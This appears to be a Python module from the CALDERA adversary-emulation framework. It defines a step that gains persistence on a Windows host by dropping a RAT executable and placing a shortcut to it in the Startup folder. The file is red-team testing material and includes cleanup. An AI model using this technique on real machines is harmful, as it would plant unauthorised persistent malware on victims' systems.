import plugins.adversary.app.config as config
from plugins.adversary.app.commands import static
from plugins.adversary.app.operation.operation import Step, OPRat, OPFile, OPPersistence, OPVar, OPHost


class Modify_Shortcut(Step):
    """
    Description:
        This step attempts to obtain persistence by creating and manipulating a shortcut in the
        Windows startup folder.
    Requirements:
        Requires an elevated rat on the target machine.
    """
    attack_mapping = [('T1023', 'Persistence')]
    display_name = "shortcut_modify"
    summary = "Modifies a startup shortcut in order to maintain persistence"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host")))]
    postconditions = [("file_g", OPFile),
                      ("persistence_g", OPPersistence({"host": OPVar("host"), "elevated": True}))]

    preproperties = ["rat.host.fqdn"]

    significant_parameters = []

    @staticmethod
    def description():
        return "Installing startup shortcut for persistence"

    @staticmethod
    async def simulate(operation, rat, host, persistence_g, file_g):
        return True

    @staticmethod
    async def action(operation, rat, host, persistence_g, file_g):
        target_path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\caldera.lnk"
        rat_loc = "C:\\totally_innocent_executable_seal.exe"
        await operation.drop_file(rat, rat_loc, config.settings.exe_rat_path)
        await operation.execute_shell_command(rat, *static.shortcutmodify(target_path, rat_loc))
        ret = await file_g({'path': target_path, 'host': rat.host, 'use_case': 'dropped'})
        await persistence_g({'host': rat.host, 'shortcut_artifact': ret})
        await file_g({'path': target_path, 'host': rat.host, 'use_case': 'dropped'})
        await file_g({'path': rat_loc, 'host': rat.host, 'use_case': 'dropped'})
        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for entry in file_g:
            await cleaner.delete(entry)

